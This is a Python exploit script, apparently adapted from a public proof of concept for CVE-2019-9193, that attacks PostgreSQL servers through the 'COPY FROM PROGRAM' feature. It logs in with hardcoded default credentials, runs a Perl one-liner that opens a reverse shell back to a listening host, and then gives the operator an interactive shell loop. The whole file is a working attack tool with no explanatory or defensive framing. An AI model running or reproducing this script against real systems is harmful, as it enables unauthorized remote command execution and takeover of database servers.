import psycopg2
from psycopg2.extras import RealDictCursor
import multiprocessing
import socket, sys

def PG_RCE():
    print("English Version of Org RCE: https://github.com/skyship36/CVE-2019-9193/blob/master/portgres_rce.py") # Org Creator 
    print("Please Start a Listener on port 2223")
    RHOST = input("RHOST IP : ")
    RPORT = int(("5432"))
    LHOST = ("172.17.0.1")
    LPORT = int(("2223"))
    
    try:
        r_shell = multiprocessing.Process(target=do_reverse_connection,
                                        args=((RHOST,RPORT,LHOST,LPORT)))

        rvs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rvs_server.bind((LHOST, LPORT))
        rvs_server.listen(1)

        r_shell.start()

        conn, addr = rvs_server.accept()
    except:
        print("Maybe The Port 2223 is Being Used Try Changing it?")
        sys.exit()
    print("Client Connect ", addr)

    while True:
        cmd = (input("(-1 to Exit Shell)\n>> ")+"\n").encode('ascii')

        if cmd == -1:
            conn.close()
            exit(0)

        conn.sendall(cmd)
        print(conn.recv(4096))


def do_reverse_connection(RHOST, RPORT, LHOST, LPORT):
    try:

        USER, PW, DB = "postgres", "postgresql", "template1"
    except:
        print("Maybe This Requires a Username And Password? For Auth")
        sys.exit()

    try:

        conn = psycopg2.connect(database=DB, host=RHOST, user=USER, password=PW, port=RPORT)
        pcur=conn.cursor(cursor_factory=RealDictCursor)

        cmd_list = [
                'DROP TABLE IF EXISTS RCE_BASE;',
                'CREATE TABLE RCE_BASE(filename text);',
                """COPY RCE_BASE FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);
                $c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);
                system$_ while<>;''';""".format(LHOST,LPORT),
                'DROP TABLE IF EXISTS RCE_BASE;',
            ]

        [pcur.execute(cmd) for cmd in cmd_list]
    except Exception as e:
        print("Looks Like We have a Error", e)
        return PG_RCE()

if __name__ in "__main__" :
    PG_RCE()
